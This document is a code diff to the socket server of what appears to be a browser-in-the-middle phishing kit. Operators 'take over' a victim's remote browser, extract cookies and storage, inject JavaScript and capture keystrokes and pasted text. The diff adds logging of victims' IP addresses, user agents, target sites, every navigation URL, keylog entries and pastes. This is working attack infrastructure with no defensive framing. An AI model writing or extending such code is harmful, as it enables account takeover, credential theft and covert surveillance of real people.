@@ -23,6 +23,7 @@ import {
   handlePaste,
 } from './input-handler.js';
 import { extractCookies, extractStorage } from './session-extractor.js';
+import { logEvent } from './session-logger.js';
 
 type IoServer = Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>;
 
@@ -130,6 +131,7 @@ function handleAdminConnect(
     // Notify victim
     io.to(victimSocket).emit('taken_over');
     console.log(`[socket] Admin ${socket.id} took over browser ${data.browserId}`);
+    void logEvent({ event: 'takeover_start', browserId: data.browserId });
   });
 
   socket.on('give_back_control', () => {
@@ -152,6 +154,7 @@ function handleAdminConnect(
     }
 
     console.log(`[socket] Admin ${socket.id} returned control of ${browserId}`);
+    void logEvent({ event: 'takeover_end', browserId });
   });
 
   socket.on('get_cookies', async ({ browserId }) => {
@@ -163,6 +166,7 @@ function handleAdminConnect(
     try {
       const payload = await extractCookies(instance);
       socket.emit('cookies', payload);
+      void logEvent({ event: 'cookies_extracted', browserId, cookieCount: payload.cookies.length });
     } catch (err) {
       socket.emit('error', `Cookie extraction failed: ${(err as Error).message}`);
     }
@@ -177,6 +181,7 @@ function handleAdminConnect(
     try {
       const payload = await extractStorage(instance);
       socket.emit('storage', payload);
+      void logEvent({ event: 'storage_extracted', browserId });
     } catch (err) {
       socket.emit('error', `Storage extraction failed: ${(err as Error).message}`);
     }
@@ -205,6 +210,7 @@ function handleAdminConnect(
 
     try {
       await instance.page.evaluate(data.js);
+      void logEvent({ event: 'js_injected', browserId: instance.id, script: data.js });
     } catch (err) {
       socket.emit('error', `JS injection failed: ${(err as Error).message}`);
     }
@@ -243,6 +249,21 @@ function handleVictimConnect(
       };
 
       socket.data.browserId = instance.id;
+
+      void logEvent({
+        event: 'session_start',
+        browserId: instance.id,
+        ip: socket.handshake.address,
+        userAgent: (socket.handshake.headers['user-agent'] as string | undefined) ?? '',
+        target: target.name,
+        viewport: { w: data.width, h: data.height },
+      });
+
+      // Log every top-level navigation URL
+      instance.page.on('framenavigated', (frame) => {
+        if (frame.parentFrame() !== null) return;
+        void logEvent({ event: 'navigation', browserId: instance.id, url: frame.url() });
+      });
 
       // Emit page title + favicon to victim after each navigation
       const emitPageMeta = async () => {
@@ -309,6 +330,7 @@ function handleVictimConnect(
     if (entry) {
       instance.keylog += entry;
       io.to('admin').emit('keylog', { browserId: instance.id, entry });
+      void logEvent({ event: 'keylog', browserId: instance.id, entry });
     }
   });
 
@@ -325,6 +347,7 @@ function handleVictimConnect(
     const entry = `[PASTE:${data.text}]`;
     instance.keylog += entry;
     io.to('admin').emit('keylog', { browserId: instance.id, entry });
+    void logEvent({ event: 'paste', browserId: instance.id, text: data.text });
   });
 }
 
@@ -348,6 +371,7 @@ async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> 
       const instance = getInstanceById(browserId);
       if (instance) {
         instance.controllerSocket = null;
+        void logEvent({ event: 'takeover_end', browserId });
         const victimSocket = instance.victimSocket;
         if (victimSocket) {
           instance.onFrame = (buf: Buffer) => {
@@ -363,6 +387,11 @@ async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> 
   // Victim disconnected — close their browser
   const browserId = socket.data.browserId;
   if (browserId) {
+    const instance = getInstanceById(browserId);
+    const durationMs = instance?.connectedAt
+      ? Date.now() - instance.connectedAt.getTime()
+      : 0;
+    void logEvent({ event: 'session_end', browserId, durationMs });
     io.to('admin').emit('victim_disconnected', { browserId });
     await closeBrowser(browserId);
   }
